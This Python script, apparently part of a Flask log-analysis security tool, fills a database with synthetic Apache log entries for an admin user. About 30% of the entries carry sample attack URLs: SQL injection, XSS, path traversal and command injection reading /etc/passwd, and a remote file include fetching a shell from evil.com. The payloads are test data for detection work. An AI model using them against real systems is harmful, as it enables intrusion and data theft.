#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
生成测试数据并验证 API
"""
import sys
import os
sys.path.insert(0, os.path.dirname(__file__))

from app import create_app, db
from app.models import User, LogImport, LogEntry, AnalysisResult
from datetime import datetime, timedelta
import random

def generate_test_data():
    """生成测试数据"""
    app = create_app()
    
    with app.app_context():
        # 获取 admin 用户
        user = User.query.filter_by(username='admin').first()
        if not user:
            print("❌ 找不到 admin 用户")
            return
        
        print(f"✅ 找到用户: {user.username} (ID: {user.user_id})")
        
        # 检查是否已有日志
        existing_count = LogEntry.query.join(LogImport).filter(
            LogImport.user_id == user.user_id
        ).count()
        
        if existing_count > 100:
            print(f"✅ 已有 {existing_count} 条日志，跳过生成")
            return
        
        print(f"📊 当前日志数: {existing_count}，开始生成测试数据...")
        
        # 创建导入记录
        log_import = LogImport(
            user_id=user.user_id,
            filename='test_generated.log',
            log_format='apache',
            total_lines=200,
            parsed_lines=200,
            import_time=datetime.now(),
            status='completed'
        )
        db.session.add(log_import)
        db.session.flush()
        
        # 生成 200 条测试日志
        ips = ['192.168.1.100', '10.0.0.50', '172.16.0.1', '203.0.113.42', '198.51.100.23']
        urls_normal = [
            '/index.html',
            '/api/users',
            '/login',
            '/dashboard',
            '/static/css/style.css',
        ]
        urls_attack = [
            "/search?q=1' OR '1'='1",
            "/page?content=<script>alert('xss')</script>",
            "/files/../../../etc/passwd",
            "/cmd?exec=;cat /etc/passwd",
            "/include?page=http://evil.com/shell.php",
        ]
        
        for i in range(200):
            ip = random.choice(ips)
            
            # 70% 正常，30% 攻击
            if random.random() < 0.7:
                url = random.choice(urls_normal)
                risk_score = random.randint(0, 10)
                keywords = ''
            else:
                url = random.choice(urls_attack)
                risk_score = random.randint(20, 80)
                keywords = random.choice(['sqli', 'xss', 'traversal', 'injection'])
            
            entry = LogEntry(
                import_id=log_import.import_id,
                ip_address=ip,
                request_time=datetime.now() - timedelta(hours=random.randint(0, 168)),
                method=random.choice(['GET', 'POST']),
                url=url,
                parameters='',
                status_code=random.choice([200, 200, 200, 404, 500]),
                response_size=random.randint(100, 50000),
                user_agent='Mozilla/5.0 (Test)',
                raw_log=f'{ip} - - [{datetime.now()}] "GET {url} HTTP/1.1" 200',
                initial_risk_score=risk_score,
                risk_keywords=keywords,
                is_analyzed=False
            )
            db.session.add(entry)
        
        db.session.commit()
        print(f"✅ 成功生成 200 条测试日志")
        
        # 验证
        total = LogEntry.query.join(LogImport).filter(
            LogImport.user_id == user.user_id
        ).count()
        print(f"📊 总日志数: {total}")

if __name__ == '__main__':
    generate_test_data()
